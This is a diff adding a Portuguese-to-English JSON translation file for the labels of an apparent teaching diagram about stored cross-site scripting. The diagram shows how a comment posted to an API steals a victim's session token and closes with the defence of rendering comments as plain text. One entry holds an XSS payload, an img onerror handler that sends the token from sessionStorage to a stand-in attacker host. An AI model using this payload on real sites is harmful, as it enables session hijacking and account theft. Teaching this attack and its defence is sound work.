@@ -1,0 +1,23 @@
+{
+ "Atacante": "Attacker",
+ "e o seu servidor": "and their server",
+ "Servidor da aplicação (API)": "Application server (API)",
+ "guarda o comentário tal como veio\ne devolve-o, no JSON, a quem o pedir": "stores the comment as it arrived\nand returns it, in JSON, to whoever asks",
+ "Browser da vítima": "Victim's browser",
+ "sessionStorage: token da vítima": "sessionStorage: victim's token",
+ "a página mostra o comentário como HTML:\no browser executa o código, que lê o token": "the page shows the comment as HTML:\nthe browser runs the code, which reads the token",
+ "3": "",
+ "1": "",
+ "POST /comentarios": "",
+ "o comentário:": "the comment:",
+ "Ótimo livro! <img src=x onerror=\"fetch('https://mau.pt/?t='": "Great book! <img src=x onerror=\"fetch('https://evil.example/?t='",
+ "                     + sessionStorage.getItem('token'))\">": "",
+ "2": "",
+ "GET /comentarios": "",
+ "4": "",
+ "o token da vítima": "the victim's token",
+ "5": "",
+ "Authorization: Bearer <token da vítima>": "Authorization: Bearer <victim's token>",
+ "Defesa: a página mostra o comentário como texto simples, nunca como HTML;": "Defence: the page shows the comment as plain text, never as HTML;",
+ "o <img ...> aparece escrito no ecrã, tal como o atacante o escreveu, e nada é executado.": "the <img ...> appears written on screen, exactly as the attacker wrote it, and nothing runs."
+}
